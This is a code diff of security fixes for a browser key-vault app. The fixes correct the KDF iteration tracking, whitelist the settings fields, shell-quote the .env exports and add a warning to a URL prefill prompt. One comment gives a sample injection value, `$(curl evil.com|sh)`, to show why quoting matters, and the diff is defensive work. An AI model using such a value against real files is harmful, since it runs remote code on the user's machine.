@@ -793,37 +793,60 @@
       let derivedKey = null;
       let salt = null;
       let vault = null;
+      let kdfIterations = null;
 
       function isLocked() { return derivedKey === null; }
-      function unlock(key, saltBytes, vaultData) {
+      function unlock(key, saltBytes, vaultData, iterations) {
         derivedKey = key; salt = saltBytes; vault = vaultData;
+        kdfIterations = iterations || null;
       }
-      function lock() { derivedKey = null; salt = null; vault = null; }
+      function lock() { derivedKey = null; salt = null; vault = null; kdfIterations = null; }
       function getVault() { return vault; }
       function getKey() { return derivedKey; }
       function getSalt() { return salt; }
+      function getIterations() { return kdfIterations; }
       function setVault(v) { vault = v; }
       function createEmptyVault() { return { version: 1, projects: [] }; }
 
-      return { isLocked, unlock, lock, getVault, getKey, getSalt, setVault, createEmptyVault };
+      return { isLocked, unlock, lock, getVault, getKey, getSalt, getIterations, setVault, createEmptyVault };
     })();
 
     const Settings = (() => {
       const KEY = 'keyvault_sidekick_settings';
       const DEFAULTS = { idleTimeoutMins: 15, clipboardClearSecs: 30 };
 
+      // SECURITY (VC-SEC-05): explicit field whitelist rather than Object.assign
+      // of arbitrary JSON. Eliminates prototype-pollution surface if anything
+      // ever writes to the settings localStorage key.
       function load() {
+        let parsed = null;
         try {
           const raw = localStorage.getItem(KEY);
-          if (!raw) return Object.assign({}, DEFAULTS);
-          const parsed = JSON.parse(raw);
-          if (typeof parsed !== 'object' || parsed === null) return Object.assign({}, DEFAULTS);
-          return Object.assign({}, DEFAULTS, parsed);
-        } catch { return Object.assign({}, DEFAULTS); }
+          if (raw) {
+            parsed = JSON.parse(raw);
+            if (typeof parsed !== 'object' || parsed === null) parsed = null;
+          }
+        } catch { parsed = null; }
+        const safe = { ...DEFAULTS };
+        if (parsed && Number.isFinite(parsed.idleTimeoutMins) && parsed.idleTimeoutMins >= 0) {
+          safe.idleTimeoutMins = parsed.idleTimeoutMins;
+        }
+        if (parsed && Number.isFinite(parsed.clipboardClearSecs) && parsed.clipboardClearSecs >= 0) {
+          safe.clipboardClearSecs = parsed.clipboardClearSecs;
+        }
+        return safe;
       }
 
       function save(s) {
-        try { localStorage.setItem(KEY, JSON.stringify(s)); } catch { /* ignore */ }
+        // Only persist known fields, ignoring anything else the caller may have
+        // tacked on. Defense-in-depth alongside load()'s whitelist.
+        try {
+          const safe = {
+            idleTimeoutMins: Number.isFinite(s.idleTimeoutMins) ? s.idleTimeoutMins : DEFAULTS.idleTimeoutMins,
+            clipboardClearSecs: Number.isFinite(s.clipboardClearSecs) ? s.clipboardClearSecs : DEFAULTS.clipboardClearSecs
+          };
+          localStorage.setItem(KEY, JSON.stringify(safe));
+        } catch { /* ignore */ }
       }
 
       return { load, save, DEFAULTS };
@@ -1086,7 +1109,12 @@
         return vault;
       }
 
-      async function encryptAndSave(vault, key, salt) {
+      // SECURITY (VC-SEC-01): iterations must match what the in-memory key was
+      // actually derived with — NOT the current PBKDF2_ITERATIONS constant.
+      // Otherwise a future iteration bump would silently lock users out the
+      // first time they save after upgrading.
+      async function encryptAndSave(vault, key, salt, iterations) {
+        const iter = iterations || VaultCrypto.PBKDF2_ITERATIONS;
         const plaintext = JSON.stringify(vault);
         const { iv, ciphertext } = await VaultCrypto.encrypt(plaintext, key);
         VaultStorage.save({
@@ -1094,7 +1122,7 @@
           kdf: {
             algorithm: VaultCrypto.KDF_ALGORITHM,
             hash: VaultCrypto.HASH,
-            iterations: VaultCrypto.PBKDF2_ITERATIONS,
+            iterations: iter,
             salt: VaultCrypto.toBase64(salt)
           },
           cipher: { algorithm: VaultCrypto.ALGORITHM, iv, ciphertext },
@@ -1107,7 +1135,7 @@
         const original = VaultState.getVault();
         const draft = JSON.parse(JSON.stringify(original));
         mutator(draft);
-        await encryptAndSave(draft, VaultState.getKey(), VaultState.getSalt());
+        await encryptAndSave(draft, VaultState.getKey(), VaultState.getSalt(), VaultState.getIterations());
         VaultState.setVault(draft);
       }
 
@@ -2246,8 +2274,9 @@
         const salt = VaultCrypto.generateSalt();
         const key = await VaultCrypto.deriveKey(password, salt);
         const vault = VaultState.createEmptyVault();
-        await encryptAndSave(vault, key, salt);
-        VaultState.unlock(key, salt, vault);
+        const iter = VaultCrypto.PBKDF2_ITERATIONS;
+        await encryptAndSave(vault, key, salt, iter);
+        VaultState.unlock(key, salt, vault, iter);
         navigate('projects');
         checkPrefill();
         resetIdleTimer();
@@ -2271,7 +2300,8 @@
         try { parsed = JSON.parse(plaintext); }
         catch { throw new Error('Vault decrypted but contents are not valid JSON. Vault may be corrupt.'); }
         const vault = validateAndNormalizeVault(parsed);
-        VaultState.unlock(key, salt, vault);
+        // Track the iterations the active key was derived with — see VC-SEC-01
+        VaultState.unlock(key, salt, vault, blob.kdf.iterations);
         navigate('projects');
         checkPrefill();
         resetIdleTimer();
@@ -2446,15 +2476,24 @@
         setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 1000);
       }
 
+      // SECURITY (VC-SEC-06): single-quote values for shell-safe .env / .envrc
+      // export. Without this, a value like `$(curl evil.com|sh)` would execute
+      // when the user `source`s the .env or when direnv evaluates the .envrc.
+      // The transform: wrap value in '...' and replace any literal ' with '\''
+      // (close quote, escape literal quote, reopen quote — standard POSIX).
+      function shellQuote(v) {
+        return "'" + String(v).replace(/'/g, "'\\''") + "'";
+      }
+
       function formatExportContent(keys, format) {
         if (!keys.length) return '';
-        if (format === 'envrc') return keys.map(k => `export ${k.name}=${k.value}`).join('\n');
+        if (format === 'envrc') return keys.map(k => `export ${k.name}=${shellQuote(k.value)}`).join('\n');
         if (format === 'settings') {
           const env = {};
           for (const k of keys) env[k.name] = k.value;
           return JSON.stringify({ env }, null, 2);
         }
-        return keys.map(k => `${k.name}=${k.value}`).join('\n'); // .env
+        return keys.map(k => `${k.name}=${shellQuote(k.value)}`).join('\n'); // .env
       }
 
       // ── Export screen ─────────────────────────────────────────────────────────
@@ -3210,8 +3249,9 @@ py -3 -m http.server 8091
                 const normNew = VaultCrypto.normalizePassword(nw);
                 const newSalt = VaultCrypto.generateSalt();
                 const newKey = await VaultCrypto.deriveKey(normNew, newSalt);
-                await encryptAndSave(VaultState.getVault(), newKey, newSalt);
-                VaultState.unlock(newKey, newSalt, VaultState.getVault());
+                const newIter = VaultCrypto.PBKDF2_ITERATIONS;
+                await encryptAndSave(VaultState.getVault(), newKey, newSalt, newIter);
+                VaultState.unlock(newKey, newSalt, VaultState.getVault(), newIter);
                 closeModal();
                 showToast('Master password changed');
               } catch (err) {
@@ -3305,7 +3345,7 @@ py -3 -m http.server 8091
           title: 'Save key from Claude',
           body: `
             <div class="prefill-banner" style="margin-bottom:16px">
-              ⚡ Claude passed a key via URL. Review the details below and save it to your vault.
+              ⚡ A key was passed to KeyVault via URL. <strong>Confirm only if you initiated this request.</strong> Review the value carefully before saving — anyone who could get you to click a link can prefill this modal.
             </div>
             <form id="pf-form" novalidate>
               <div class="field">
